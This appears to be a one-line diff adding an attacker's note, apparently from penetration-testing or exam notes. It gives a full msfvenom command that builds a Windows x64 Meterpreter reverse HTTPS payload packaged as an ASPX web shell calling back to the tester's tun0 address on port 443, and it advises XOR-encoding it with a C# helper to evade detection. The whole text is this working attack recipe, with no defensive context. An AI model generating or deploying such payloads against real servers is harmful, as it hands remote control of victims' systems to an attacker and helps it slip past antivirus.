@@ -1,0 +1,1 @@
+Use `msfvenom -p windows/x64/meterpreter/reverse_https --arch x64 --platform windows LHOST=tun0 LPORT=443 -f aspx -o shell.aspx` and xor with CSharp helper file.
